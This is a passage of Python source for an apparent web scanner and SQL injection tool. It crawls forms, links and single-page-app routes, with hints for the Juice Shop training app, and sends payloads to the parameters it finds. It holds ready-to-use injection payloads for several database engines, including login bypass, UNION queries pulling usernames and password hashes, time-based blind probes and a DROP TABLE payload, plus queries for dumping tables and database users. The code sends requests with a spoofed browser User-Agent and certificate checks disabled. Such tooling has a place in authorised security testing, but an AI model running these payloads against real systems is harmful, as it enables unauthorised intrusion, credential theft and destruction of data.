import hashlib
import json
import os
import re
import time
import random
import string
import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
from collections.abc import Callable
from datetime import datetime, timezone
from html.parser import HTMLParser
from typing import Any
from urllib.parse import parse_qsl, urljoin, urlparse, urlencode

_MAX_ENTRY_POINTS = 250
_MAX_ERROR_INDICATORS = 30
_MAX_HTML_PARSE = 250000

_COMMON_HEADER_CANDIDATES: tuple[str, ...] = (
    "User-Agent",
    "Referer",
    "X-Forwarded-For",
    "X-Real-IP",
    "X-Client-IP",
)

_JS_URL_TOKEN_RX = re.compile(r"""(?:"|')(https?://[^"'<> ]+|/[^"'<> ]+)(?:"|')""", re.I)
_SPA_MARKERS: tuple[str, ...] = (
    "<app-root",
    "ng-version",
    "angular",
    "main.js",
    "runtime.js",
)
_SPA_ROUTE_PARAM_HINTS: tuple[tuple[str, str, tuple[str, ...]], ...] = (
    ("/rest/products/search", "GET", ("q",)),
    ("/rest/products", "GET", ("q", "search", "page", "limit")),
    ("/rest/user/login", "POST", ("email", "password")),
    ("/rest/user/change-password", "POST", ("currentPassword", "newPassword", "repeatPassword")),
    ("/rest/user/reset-password", "POST", ("email", "answer", "new")),
    ("/rest/recycle-bin", "GET", ("page",)),
    (
        "/api/Users/",
        "POST",
        ("email", "password", "passwordRepeat", "securityQuestion", "securityAnswer"),
    ),
    ("/login", "POST", ("email", "password")),
    (
        "/register",
        "POST",
        ("email", "password", "passwordRepeat", "securityQuestion", "securityAnswer"),
    ),
)
_SPA_RUNTIME_NAV_TIMEOUT_MS = 16000
_SPA_RUNTIME_POST_LOAD_WAIT_MS = 2200
_SPA_RUNTIME_MAX_NETWORK_URLS = 350
_SPA_RUNTIME_MAX_DOM_FORMS = 120
_SPA_RUNTIME_MAX_DOM_LINKS = 260

_SQL_ERROR_SIGNATURES: tuple[tuple[str, re.Pattern[str]], ...] = (
    ("mysql", re.compile(r"У вас ошибка в синтаксисе SQL|mysql_fetch|mysqli?_query|mariadb|you have an error in your sql syntax", re.I)),
    ("postgresql", re.compile(r"postgresql.*error|pg_query|pg_exec|синтаксическая ошибка в или около|syntax error at or near", re.I)),
    ("mssql", re.compile(r"microsoft sql server|odbc sql server driver|незакрытая кавычка|unclosed quotation mark after the character string", re.I)),
    ("oracle", re.compile(r"\bORA-\d{5}\b|ошибка oracle|строка в кавычках не завершена должным образом", re.I)),
    ("sqlite", re.compile(r'sqlite(?:3)?::|ошибка sqlite|около ".+": синтаксическая ошибка|sqlite error', re.I)),
    ("db2", re.compile(r"\bОшибка SQL DB2\b|\bКОД SQL\b|\bSQLCODE\b", re.I)),
    ("generic-sql", re.compile(r"синтакс.*sql|ошибка базы данных|неверный запрос|запрос не выполнен|sql syntax|database error", re.I)),
)

_SQL_INJECTION_PAYLOADS = {
    "mysql": [
        "' OR '1'='1",
        '" OR "1"="1',
        "' UNION SELECT NULL, username, password FROM users--",
        "'; DROP TABLE users--",
        "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
        "' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users')>0--",
        "' AND (SELECT SUBSTRING(@@version,1,1))='5'--",
        "' AND (SELECT SUBSTRING(@@datadir,1,1))='/'--",
        "' UNION SELECT table_name, column_name, NULL FROM information_schema.columns--",
    ],
    "postgresql": [
        "' OR '1'='1",
        '" OR "1"="1',
        "' UNION SELECT NULL, usename, passwd FROM pg_shadow--",
        "'; DROP TABLE users--",
        "' AND (SELECT COUNT(*) FROM pg_tables)>0--",
        "' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users')>0--",
        "' AND (SELECT SUBSTRING(version(),1,1))='P'--",
        "' UNION SELECT table_name, column_name, NULL FROM information_schema.columns--",
    ],
    "mssql": [
        "' OR '1'='1",
        '" OR "1"="1',
        "' UNION SELECT NULL, name, password FROM sysusers--",
        "'; DROP TABLE users--",
        "' AND (SELECT COUNT(*) FROM sysobjects)>0--",
        "' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users')>0--",
        "' AND (SELECT SUBSTRING(@@version,1,1))='M'--",
        "' UNION SELECT table_name, column_name, NULL FROM information_schema.columns--",
    ],
    "sqlite": [
        "' OR '1'='1",
        '" OR "1"="1',
        "' UNION SELECT NULL, name, password FROM sqlite_master--",
        "'; DROP TABLE users--",
        "' AND (SELECT COUNT(*) FROM sqlite_master)>0--",
        "' UNION SELECT sql FROM sqlite_master WHERE type='table'--",
    ],
    "oracle": [
        "' OR '1'='1",
        '" OR "1"="1',
        "' UNION SELECT NULL, username, password FROM dba_users--",
        "'; DROP TABLE users--",
        "' AND (SELECT COUNT(*) FROM user_tables)>0--",
        "' AND (SELECT SUBSTR(version,1,1))='O'--",
        "' UNION SELECT table_name, column_name, NULL FROM user_tab_columns--",
    ],
    "generic": [
        "' OR '1'='1",
        '" OR "1"="1',
        "' UNION SELECT NULL, username, password FROM users--",
        "'; DROP TABLE users--",
        "' AND 1=1--",
        "' AND 1=2--",
        "' WAITFOR DELAY '00:00:05'--",
        "'; SLEEP(5)--",
        "'; pg_sleep(5)--",
    ]
}

_DB_EXTRACTION_QUERIES = {
    "mysql": {
        "tables": "SELECT table_name FROM information_schema.tables WHERE table_schema=database()",
        "columns": "SELECT column_name FROM information_schema.columns WHERE table_name='{table}'",
        "data": "SELECT {columns} FROM {table}",
        "version": "SELECT @@version",
        "users": "SELECT user, host FROM mysql.user",
        "databases": "SELECT schema_name FROM information_schema.schemata",
    },
    "postgresql": {
        "tables": "SELECT tablename FROM pg_tables WHERE schemaname='public'",
        "columns": "SELECT column_name FROM information_schema.columns WHERE table_name='{table}'",
        "data": "SELECT {columns} FROM {table}",
        "version": "SELECT version()",
        "users": "SELECT usename FROM pg_user",
        "databases": "SELECT datname FROM pg_database",
    },
    "mssql": {
        "tables": "SELECT name FROM sysobjects WHERE xtype='U'",
        "columns": "SELECT name FROM syscolumns WHERE id=OBJECT_ID('{table}')",
        "data": "SELECT {columns} FROM {table}",
        "version": "SELECT @@version",
        "users": "SELECT name FROM sysusers",
        "databases": "SELECT name FROM sysdatabases",
    },
    "sqlite": {
        "tables": "SELECT name FROM sqlite_master WHERE type='table'",
        "columns": "PRAGMA table_info({table})",
        "data": "SELECT {columns} FROM {table}",
        "version": "SELECT sqlite_version()",
    },
    "oracle": {
        "tables": "SELECT table_name FROM user_tables",
        "columns": "SELECT column_name FROM user_tab_columns WHERE table_name='{table}'",
        "data": "SELECT {columns} FROM {table}",
        "version": "SELECT banner FROM v$version",
        "users": "SELECT username FROM dba_users",
    }
}


class _HtmlSurfaceParser(HTMLParser):
    def __init__(self, base_url: str) -> None:
        super().__init__(convert_charrefs=True)
        self.base_url = base_url
        self.links: list[str] = []
        self.forms: list[dict[str, Any]] = []
        self._current_form: dict[str, Any] | None = None

    def handle_starttag(self, tag: str, attrs: list[tuple[str, str | None]]) -> None:
        attr = {k.lower(): (v or "") for k, v in attrs}
        tag_l = tag.lower()
        if tag_l == "a":
            href = attr.get("href", "").strip()
            if href:
                self.links.append(urljoin(self.base_url, href))
            return
        if tag_l == "form":
            action = attr.get("action", "").strip() or self.base_url
            method = (attr.get("method", "get") or "get").strip().upper()
            self._current_form = {
                "action": urljoin(self.base_url, action),
                "method": method if method in {"GET", "POST"} else "GET",
                "fields": [],
            }
            return
        if tag_l in {"input", "textarea", "select"} and self._current_form is not None:
            name = attr.get("name", "").strip()
            if not name:
                return
            field_type = attr.get("type", tag_l).strip().lower() or tag_l
            self._current_form["fields"].append({"name": name[:120], "type": field_type[:40]})

    def handle_endtag(self, tag: str) -> None:
        if tag.lower() == "form" and self._current_form is not None:
            self.forms.append(self._current_form)
            self._current_form = None

    def close(self) -> None:
        super().close()
        if self._current_form is not None:
            self.forms.append(self._current_form)
            self._current_form = None


def _make_finding(
    source: str,
    severity: str,
    title: str,
    evidence: str,
    recommendation: str,
    affected: str,
) -> dict[str, Any]:
    return {
        "source": source,
        "severity": severity,
        "title": title,
        "evidence": evidence,
        "recommendation": recommendation,
        "affected": affected,
    }


def _entry_key(item: dict[str, Any]) -> tuple[str, str, str, str]:
    return (
        str(item.get("type", "")),
        str(item.get("location", "")),
        str(item.get("method", "")),
        str(item.get("name", "")),
    )


def _same_origin(candidate_url: str, target_url: str) -> bool:
    c = urlparse(candidate_url)
    t = urlparse(target_url)
    return c.scheme in {"http", "https"} and c.netloc.lower() == t.netloc.lower()


def _add_unique(out: list[dict[str, Any]], seen: set[tuple[str, str, str, str]], item: dict[str, Any]) -> None:
    key = _entry_key(item)
    if key in seen or len(out) >= _MAX_ENTRY_POINTS:
        return
    seen.add(key)
    out.append(item)


def _parse_set_cookie_names(set_cookie_list: list[str]) -> list[str]:
    names: list[str] = []
    seen: set[str] = set()
    for raw in set_cookie_list:
        first = str(raw).split(";", 1)[0].strip()
        if "=" not in first:
            continue
        name = first.split("=", 1)[0].strip()
        if not name or name.lower() in seen:
            continue
        seen.add(name.lower())
        names.append(name[:120])
    return names


def _extract_query_param_names(raw_url: str) -> list[str]:
    parsed = urlparse(raw_url)
    names: list[str] = []
    seen: set[str] = set()
    for name, _value in parse_qsl(parsed.query, keep_blank_values=True):
        nl = name.lower()
        if not name or nl in seen:
            continue
        seen.add(nl)
        names.append(name[:120])
    return names


def _extract_body_param_names(payload: str, content_type: str) -> list[str]:
    body = (payload or "").strip()
    if not body:
        return []
    names: list[str] = []
    seen: set[str] = set()

    def _add(name: str) -> None:
        n = (name or "").strip()
        if not n:
            return
        nl = n.lower()
        if nl in seen:
            return
        seen.add(nl)
        names.append(n[:120])

    ctype = (content_type or "").lower()
    if "application/x-www-form-urlencoded" in ctype:
        for key, _value in parse_qsl(body, keep_blank_values=True):
            _add(key)
        return names

    if "json" in ctype or body.startswith("{") or body.startswith("["):
        try:
            parsed = json.loads(body)
        except Exception:
            return names
        if isinstance(parsed, dict):
            for key, value in parsed.items():
                _add(str(key))
                if key == "variables" and isinstance(value, dict):
                    for vk in value.keys():
                        _add(str(vk))
        return names
    return names


def _extract_js_candidate_urls(target_url: str, html: str) -> list[str]:
    out: list[str] = []
    seen: set[str] = set()
    for match in _JS_URL_TOKEN_RX.finditer(html[:_MAX_HTML_PARSE]):
        raw = (match.group(1) or "").strip()
        if not raw:
            continue
        full = urljoin(target_url, raw)
        if not _same_origin(full, target_url):
            continue
        if full in seen:
            continue
        seen.add(full)
        out.append(full)
        if len(out) >= 300:
            break
    return out


def _looks_like_spa_shell(html: str) -> bool:
    lower = (html or "").lower()
    if not lower:
        return False
    marker_hits = sum(1 for marker in _SPA_MARKERS if marker in lower)
    return marker_hits >= 2 and "<form" not in lower


def _env_flag(name: str, default: bool = False) -> bool:
    raw = str(os.getenv(name, "")).strip().lower()
    if not raw:
        return default
    return raw in {"1", "true", "yes", "on"}


def _spa_runtime_mode() -> str:
    mode = str(os.getenv("SECURITY_COMBINE_SPA_RUNTIME", "auto")).strip().lower()
    if mode in {"off", "0", "false", "no"}:
        return "off"
    if mode in {"on", "1", "true", "yes"}:
        return "on"
    return "auto"


def _should_collect_spa_runtime(target_url: str, html: str) -> bool:
    mode = _spa_runtime_mode()
    if mode == "off":
        return False
    if mode == "on":
        return True
    return _looks_like_spa_shell(html) or _is_juice_shop_target(target_url)


def _collect_spa_runtime_entries(target_url: str, html: str) -> tuple[list[dict[str, Any]], dict[str, Any]]:
    meta: dict[str, Any] = {
        "enabled": _should_collect_spa_runtime(target_url, html),
        "attempted": False,
        "ok": False,
    }
    if not meta["enabled"]:
        meta["reason"] = "disabled_or_not_spa"
        return [], meta

    try:
        from playwright.sync_api import TimeoutError as PlaywrightTimeoutError
        from playwright.sync_api import sync_playwright
    except Exception as exc:
        meta["attempted"] = True
        meta["reason"] = "playwright_unavailable"
        meta["error"] = str(exc)[:220]
        return [], meta

    runtime_entries: list[dict[str, Any]] = []
    net_urls: list[str] = []
    net_requests: list[dict[str, str]] = []
    net_seen: set[str] = set()
    snapshots: list[dict[str, Any]] = []
    route_urls: list[str] = []
    route_seen: set[str] = set()
    keyword_labels = ("login", "register", "search")

    def _capture_request(request: Any) -> None:
        if len(net_urls) >= _SPA_RUNTIME_MAX_NETWORK_URLS:
            return
        req_url = str(getattr(request, "url", "") or "").strip()
        if not req_url or req_url in net_seen:
            return
        if not _same_origin(req_url, target_url):
            return
        net_seen.add(req_url)
        net_urls.append(req_url)
        method = str(getattr(request, "method", "") or "GET").upper()
        headers = getattr(request, "headers", {}) or {}
        if isinstance(headers, dict):
            content_type = str(headers.get("content-type") or headers.get("Content-Type") or "")
        else:
            content_type = ""
        post_data = str(getattr(request, "post_data", "") or "")
        if len(post_data) > 12000:
            post_data = post_data[:12000]
        net_requests.append({
            "url": req_url,
            "method": method,
            "content_type": content_type,
            "post_data": post_data,
        })

    def _queue_route(url: str) -> None:
        if not url or url in route_seen:
            return
        if not _same_origin(url, target_url):
            return
        route_seen.add(url)
        route_urls.append(url)

    nav_timeout = int(os.getenv("SECURITY_COMBINE_SPA_RUNTIME_TIMEOUT_MS", str(_SPA_RUNTIME_NAV_TIMEOUT_MS)) or _SPA_RUNTIME_NAV_TIMEOUT_MS)
    nav_timeout = max(5000, min(nav_timeout, 45000))
    post_wait_ms = int(os.getenv("SECURITY_COMBINE_SPA_RUNTIME_WAIT_MS", str(_SPA_RUNTIME_POST_LOAD_WAIT_MS)) or _SPA_RUNTIME_POST_LOAD_WAIT_MS)
    post_wait_ms = max(500, min(post_wait_ms, 8000))
    headless = not _env_flag("SECURITY_COMBINE_SPA_RUNTIME_HEADFUL", default=False)

    try:
        meta["attempted"] = True
        with sync_playwright() as playwright:
            browser = playwright.chromium.launch(headless=headless, args=["--disable-dev-shm-usage"])
            context = browser.new_context(ignore_https_errors=True)
            page = context.new_page()
            page.on("request", _capture_request)

            def _settle_page() -> None:
                try:
                    page.wait_for_load_state("networkidle", timeout=max(3500, nav_timeout // 2))
                except PlaywrightTimeoutError:
                    pass
                page.wait_for_timeout(post_wait_ms)

            def _snapshot(label: str) -> None:
                dom = page.evaluate("""
                (label) => {
                  const asAbs = (u) => {
                    try { return new URL(u, window.location.href).toString(); } catch (_e) { return ''; }
                  };
                  const forms = Array.from(document.querySelectorAll('form')).slice(0, 120).map((form) => {
                    const action = asAbs(form.getAttribute('action') || window.location.href);
                    const method = (form.getAttribute('method') || 'GET').toUpperCase();
                    const fields = Array.from(form.querySelectorAll('input[name], textarea[name], select[name]')).map((el) => ({
                      name: (el.getAttribute('name') || '').trim(),
                      type: (el.getAttribute('type') || el.tagName || '').toLowerCase()
                    })).filter((f) => !!f.name);
                    return { action, method, fields };
                  });
                  const links = Array.from(document.querySelectorAll('a[href], [routerLink], [ng-reflect-router-link]')).slice(0, 260).map((el) => {
                    const href = el.getAttribute('href') || el.getAttribute('routerLink') || el.getAttribute('ng-reflect-router-link') || '';
                    return asAbs(href);
                  }).filter(Boolean);
                  const routeCandidates = Array.from(document.querySelectorAll('a[href], [routerLink], [ng-reflect-router-link]'))
                    .slice(0, 320)
                    .map((el) => {
                      const raw = (el.getAttribute('href') || el.getAttribute('routerLink') || el.getAttribute('ng-reflect-router-link') || '').trim();
                      const text = (el.textContent || '').toLowerCase();
                      const low = raw.toLowerCase();
                      const matched = ['login', 'register', 'search'].some((kw) => low.includes(kw) || text.includes(kw));
                      if (!matched) return '';
                      return asAbs(raw);
                    })
                    .filter(Boolean);
                  const standaloneInputs = Array.from(document.querySelectorAll('input[name], textarea[name], select[name]'))
                    .slice(0, 180)
                    .map((el) => (el.getAttribute('name') || '').trim())
                    .filter(Boolean);
                  return { forms, links, routeCandidates, standaloneInputs, currentUrl: window.location.href || '', label };
                }
                """, label)
                if isinstance(dom, dict):
                    snapshots.append(dom)
                    for route in dom.get("routeCandidates") or []:
                        _queue_route(str(route or "").strip())

            try:
                page.goto(target_url, wait_until="domcontentloaded", timeout=nav_timeout)
            except PlaywrightTimeoutError:
                meta["timeout"] = True
            _settle_page()
            _snapshot("home")

            for keyword in keyword_labels:
                clicked = False
                selectors = (
                    f"a[href*='{keyword}' i]",
                    f"[routerLink*='{keyword}' i]",
                    f"[ng-reflect-router-link*='{keyword}' i]",
                    f"button[aria-label*='{keyword}' i]",
                    f"button:has-text('{keyword}')",
                    f"a:has-text('{keyword}')",
                )
                for selector in selectors:
                    try:
                        node = page.locator(selector).first
                        if node.count() <= 0:
                            continue
                        node.click(timeout=1800)
                        clicked = True
                        break
                    except Exception:
                        continue
                if clicked:
                    _settle_page()
                    _snapshot(f"click:{keyword}")
                    try:
                        page.goto(target_url, wait_until="domcontentloaded", timeout=nav_timeout)
                        _settle_page()
                    except Exception:
                        pass

            parsed_target = urlparse(target_url)
            origin = f"{parsed_target.scheme}://{parsed_target.netloc}"
            default_routes = (
                f"{origin}/login",
                f"{origin}/register",
                f"{origin}/search?q=apple",
                f"{origin}/#/login",
                f"{origin}/#/register",
                f"{origin}/#/search?q=apple",
            )
            for route in default_routes:
                _queue_route(route)

            visited_pages: set[str] = set()
            for route in route_urls[:8]:
                if len(visited_pages) >= 3:
                    break
                if route in visited_pages:
                    continue
                try:
                    page.goto(route, wait_until="domcontentloaded", timeout=nav_timeout)
                except PlaywrightTimeoutError:
                    continue
                _settle_page()
                _snapshot(f"route:{route}")
                visited_pages.add(route)

            browser.close()
    except Exception as exc:
        meta["reason"] = "runtime_error"
        meta["error"] = str(exc)[:260]
        return [], meta

    for dom in snapshots:
        if not isinstance(dom, dict):
            continue
        current_url = str(dom.get("currentUrl") or "").strip()
        if current_url and _same_origin(current_url, target_url):
            _queue_route(current_url)
            if current_url not in net_seen:
                net_seen.add(current_url)
                net_urls.append(current_url)

        forms = dom.get("forms")
        if isinstance(forms, list):
            for form in forms[:_SPA_RUNTIME_MAX_DOM_FORMS]:
                if not isinstance(form, dict):
                    continue
                action = str(form.get("action") or current_url or target_url).strip()
                if not _same_origin(action, target_url):
                    continue
                method = str(form.get("method") or "GET").upper()
                if method not in {"GET", "POST", "PUT", "PATCH", "DELETE"}:
                    method = "GET"
                fields = form.get("fields")
                if not isinstance(fields, list):
                    continue
                for field in fields:
                    if not isinstance(field, dict):
                        continue
                    name = str(field.get("name") or "").strip()
                    if not name:
                        continue
                    runtime_entries.append({
                        "type": "spa_dom_field",
                        "name": name[:120],
                        "method": method,
                        "location": action,
                        "field_type": str(field.get("type") or "")[:40],
                    })

        links = dom.get("links")
        if isinstance(links, list):
            for item in links[:_SPA_RUNTIME_MAX_DOM_LINKS]:
                link = str(item or "").strip()
                if not link or not _same_origin(link, target_url):
                    continue
                parsed_link = urlparse(link)
                if not parsed_link.query:
                    continue
                location = parsed_link._replace(query="", fragment="").geturl()
                for name in _extract_query_param_names(link):
                    runtime_entries.append({"type": "spa_dom_link_param", "name": name, "method": "GET", "location": location})

        standalone_inputs = dom.get("standaloneInputs")
        if isinstance(standalone_inputs, list):
            form_like_location = current_url or target_url
            for item in standalone_inputs[:180]:
                name = str(item or "").strip()
                if not name:
                    continue
                runtime_entries.append({
                    "type": "spa_dom_input",
                    "name": name[:120],
                    "method": "POST",
                    "location": form_like_location,
                })

    for req in net_requests:
        req_url = str(req.get("url") or "").strip()
        if not req_url:
            continue
        method = str(req.get("method") or "GET").upper()
        parsed = urlparse(req_url)
        if not parsed.query:
            location = parsed._replace(query="", fragment="").geturl()
        else:
            location = parsed._replace(query="", fragment="").geturl()
            for name in _extract_query_param_names(req_url):
                runtime_entries.append({"type": "spa_net_param", "name": name, "method": "GET", "location": location})

        for name in _extract_body_param_names(str(req.get("post_data") or ""), str(req.get("content_type") or "")):
            runtime_entries.append({"type": "spa_net_body_param", "name": name, "method": method, "location": location})

    meta["ok"] = True
    meta["network_urls_captured"] = len(net_urls)
    meta["routes_discovered"] = len(route_urls)
    meta["snapshots_collected"] = len(snapshots)
    meta["entry_points_found"] = len(runtime_entries)
    return runtime_entries, meta


def _collect_probe_paths(response_meta: dict[str, Any] | None, checkpoint: dict[str, Any] | None) -> set[str]:
    out: set[str] = set()
    if isinstance(response_meta, dict):
        extras = response_meta.get("passive_extras")
        if isinstance(extras, dict):
            probes = extras.get("probes")
            if isinstance(probes, list):
                for item in probes:
                    if not isinstance(item, dict):
                        continue
                    path = str(item.get("path") or "").strip()
                    if path:
                        out.add(path if path.startswith("/") else f"/{path}")
    if isinstance(checkpoint, dict):
        probes = checkpoint.get("probe_cache")
        if isinstance(probes, dict):
            for key, item in probes.items():
                if isinstance(item, dict):
                    final_url = str(item.get("final_url") or "").strip()
                    if final_url:
                        out.add(urlparse(final_url).path or "/")
                        continue
                key_str = str(key or "")
                if ":" in key_str:
                    maybe_path = key_str.split(":", 1)[1].strip()
                    if maybe_path.startswith("/"):
                        out.add(maybe_path)
    return out


def _is_juice_shop_target(target_url: str) -> bool:
    host = urlparse(target_url).netloc.lower()
    return "juice-shop" in host


def _collect_entry_points(
    target_url: str,
    html: str,
    set_cookie_list: list[str],
    *,
    response_meta: dict[str, Any] | None = None,
    checkpoint: dict[str, Any] | None = None,
) -> list[dict[str, Any]]:
    out: list[dict[str, Any]] = []
    seen: set[tuple[str, str, str, str]] = set()
    parsed_target = urlparse(target_url)
    target_location = parsed_target._replace(query="", fragment="").geturl()
    discovered_paths: set[str] = {parsed_target.path or "/"}

    for name, _value in parse_qsl(parsed_target.query, keep_blank_values=True):
        _add_unique(out, seen, {"type": "url_param", "name": name[:120], "method": "GET", "location": target_location})

    parser = _HtmlSurfaceParser(target_url)
    try:
        parser.feed((html or "")[:_MAX_HTML_PARSE])
        parser.close()
    except Exception:
        pass

    for link in parser.links[:300]:
        if not _same_origin(link, target_url):
            continue
        parsed_link = urlparse(link)
        discovered_paths.add(parsed_link.path or "/")
        if not parsed_link.query:
            continue
        location = parsed_link._replace(query="", fragment="").geturl()
        for name, _value in parse_qsl(parsed_link.query, keep_blank_values=True):
            _add_unique(out, seen, {"type": "link_param", "name": name[:120], "method": "GET", "location": location})

    for form in parser.forms[:80]:
        action = str(form.get("action") or target_url)
        if not _same_origin(action, target_url):
            continue
        discovered_paths.add(urlparse(action).path or "/")
        method = str(form.get("method") or "GET").upper()
        for field in form.get("fields") or []:
            if not isinstance(field, dict):
                continue
            name = str(field.get("name") or "").strip()
            if not name:
                continue
            _add_unique(out, seen, {
                "type": "form_field",
                "name": name[:120],
                "method": method,
                "location": action,
                "field_type": str(field.get("type") or "")[:40],
            })

    for candidate in _extract_js_candidate_urls(target_url, html):
        parsed_candidate = urlparse(candidate)
        discovered_paths.add(parsed_candidate.path or "/")
        if not parsed_candidate.query:
            continue
        location = parsed_candidate._replace(query="", fragment="").geturl()
        for name in _extract_query_param_names(candidate):
            _add_unique(out, seen, {"type": "js_param", "name": name, "method": "GET", "location": location})

    discovered_paths.update(_collect_probe_paths(response_meta, checkpoint))
    if _looks_like_spa_shell(html) or _is_juice_shop_target(target_url):
        origin = f"{parsed_target.scheme}://{parsed_target.netloc}"
        for hint_path, method, params in _SPA_ROUTE_PARAM_HINTS:
            if hint_path not in discovered_paths and not _is_juice_shop_target(target_url):
                continue
            location = urljoin(origin, hint_path)
            for name in params:
                _add_unique(out, seen, {"type": "spa_hint_param", "name": name[:120], "method": method, "location": location})

    for name in _parse_set_cookie_names(set_cookie_list):
        _add_unique(out, seen, {"type": "cookie", "name": name, "method": "COOKIE", "location": target_location})

    for name in _COMMON_HEADER_CANDIDATES:
        _add_unique(out, seen, {"type": "header", "name": name, "method": "HEADER", "location": target_location})

    return out


def _snippet(text: str, start: int, end: int, radius: int = 90) -> str:
    left = max(0, start - radius)
    right = min(len(text), end + radius)
    return re.sub(r"\s+", " ", text[left:right]).strip()[:260]


def _find_sql_errors(text: str, location: str) -> list[dict[str, str]]:
    out: list[dict[str, str]] = []
    if not text:
        return out
    seen: set[tuple[str, str, str]] = set()
    for dbms, rx in _SQL_ERROR_SIGNATURES:
        for match in rx.finditer(text):
            snippet = _snippet(text, match.start(), match.end())
            key = (dbms, location, snippet[:120].lower())
            if key in seen:
                continue
            seen.add(key)
            out.append({"dbms": dbms, "location": location, "snippet": snippet})
            if len(out) >= _MAX_ERROR_INDICATORS:
                return out
    return out


def _collect_passive_sql_errors(
    target_url: str,
    response_meta: dict[str, Any],
    checkpoint: dict[str, Any] | None,
) -> list[dict[str, str]]:
    out: list[dict[str, str]] = []
    out.extend(_find_sql_errors(str(response_meta.get("body_preview") or ""), target_url))
    probes = checkpoint.get("probe_cache") if isinstance(checkpoint, dict) else None
    if isinstance(probes, dict):
        for key, pr in probes.items():
            if not isinstance(pr, dict):
                continue
            body = pr.get("body")
            if not isinstance(body, str) or not body:
                continue
            location = str(pr.get("final_url") or key)
            for item in _find_sql_errors(body[:200000], location):
                out.append(item)
                if len(out) >= _MAX_ERROR_INDICATORS:
                    return out
    return out[:_MAX_ERROR_INDICATORS]


def _audit_cache_key(target_url: str, response_meta: dict[str, Any], set_cookie_list: list[str]) -> str:
    body = str(response_meta.get("body_preview") or "")
    material = "\n".join([
        target_url,
        str(response_meta.get("final_url") or ""),
        body[:64000],
        "\n".join(set_cookie_list[:80]),
    ])
    return hashlib.sha256(material.encode("utf-8", errors="ignore")).hexdigest()


def _detect_dbms_type(response_text: str) -> str:
    for dbms, pattern in _SQL_ERROR_SIGNATURES:
        if pattern.search(response_text):
            return dbms
    return "generic"


def _generate_random_string(length: int = 10) -> str:
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))


def _create_session() -> requests.Session:
    session = requests.Session()
    retry = Retry(total=2, backoff_factor=0.3, status_forcelist=[429, 500, 502, 503, 504], allowed_methods=["GET", "POST", "PUT", "DELETE", "PATCH", "HEAD", "OPTIONS"])
    adapter = HTTPAdapter(max_retries=retry)
    session.mount("http://", adapter)
    session.mount("https://", adapter)
    session.headers.update({
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9,ru;q=0.8",
        "Accept-Encoding": "gzip, deflate",
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1",
    })
    return session


def _make_request(
    url: str,
    method: str = "GET",
    params: dict[str, Any] | None = None,
    data: Any = None,
    json_data: Any = None,
    headers: dict[str, str] | None = None,
    cookies: dict[str, str] | None = None,
    timeout: int = 30,
    allow_redirects: bool = True,
    verify_ssl: bool = False,
) -> requests.Response | None:
    session = _create_session()
    if cookies:
        session.cookies.update(cookies)
    request_headers = session.headers.copy()
    if headers:
        request_headers.update(headers)
    try:
        response = session.request(
            method=method.upper(),
            url=url,
            params=params,
            data=data,
            json=json_data,
            headers=request_headers,
            cookies=cookies,
            timeout=timeout,
            allow_redirects=allow_redirects,
            verify=verify_ssl,
        )
        return response
    except requests.exceptions.Timeout:
        return None
    except requests.exceptions.ConnectionError:
        return None
    except requests.exceptions.RequestException:
        return None
    finally:
        session.close()


def _get_response_text(response: requests.Response | None, max_length: int = 500000) -> str:
    if response is None:
        return ""
    try:
        if response.encoding is None or response.encoding.lower() == 'iso-8859-1':
            response.encoding = response.apparent_encoding or 'utf-8'
        text = response.text
        return text[:max_length]
    except Exception:
        try:
            return response.content.decode('utf-8', errors='ignore')[:max_length]
        except Exception:
            return ""


def _get_response_headers(response: requests.Response | None) -> dict[str, str]:
    if response is None:
        return {}
    return dict(response.headers)


def _detect_content_type(response: requests.Response | None) -> str:
    if response is None:
        return ""
    return response.headers.get("Content-Type", "").lower()


def _execute_timing_attack(
    url: str,
    param_name: str,
    param_value: str,
    payload: str,
    method: str = "GET",
    headers: dict[str, str] | None = None,
    cookies: dict[str, str] | None = None,
    timeout: float = 15.0,
) -> dict[str, Any]:
    result = {
        "url": url,
        "param_name": param_name,
        "payload": payload,
        "method": method,
        "response_time": None,
        "status_code": None,
        "response_length": None,
        "vulnerable": False,
        "error": None
    }
    start_time = time.time()
    try:
        if method.upper() == "GET":
            params = {param_name: payload}
            response = _make_request(url=url, method="GET", params=params, headers=headers, cookies=cookies, timeout=timeout)
        else:
            content_type = (headers or {}).get("Content-Type", "application/x-www-form-urlencoded")
            if "application/json" in content_type.lower():
                response = _make_request(url=url, method=method, json_data={param_name: payload}, headers=headers, cookies=cookies, timeout=timeout)
            else:
                response = _make_request(url=url, method=method, data={param_name: payload}, headers=headers, cookies=cookies, timeout=timeout)
        end_time = time.time()
        response_time = end_time - start_time
        result["response_time"] = response_time
        result["status_code"] = response.status_code if response else None
        result["response_length"] = len(response.content) if response else 0
        result["response_text_preview"] = _get_response_text(response, max_length=2000)
        if response_time >= 4.5:
            result["vulnerable"] = True
            result["vulnerability_type"] = "time_based_blind"
        return result
    except Exception as e:
        result["error"] = str(e)
        result["response_time"] = time.time() - start_time
        return result


def _execute_sql_injection(
    url: str,
    param_name: str,
    param_value: str,
    payload: str,
    method: str = "GET",
    headers: dict[str, str] | None = None,
    cookies: dict[str, str] | None = None,
    timeout: int = 30,
) -> dict[str, Any]:
    result = {
        "url": url,
        "param_name": param_name,
        "original_value": param_value,
        "payload": payload,
        "method": method,
        "status_code": None,
        "response_time": None,
        "response_length": None,
        "response_text": "",
        "headers": {},
        "dbms_type": None,
        "vulnerable": False,
        "vulnerability_indicators": [],
        "error": None
    }
    start_time = time.time()
    try:
        if method.upper() == "GET":
            params = {param_name: payload}
            response = _make_request(url=url, method="GET", params=params, headers=headers, cookies=cookies, timeout=timeout)
        else:
            content_type = (headers or {}).get("Content-Type", "application/x-www-form-urlencoded") if headers else "application/x-www-form-urlencoded"
            if "application/json" in content_type.lower():
                response = _make_request(url=url, method=method, json_data={param_name: payload}, headers=headers, cookies=cookies, timeout=timeout)
            else:
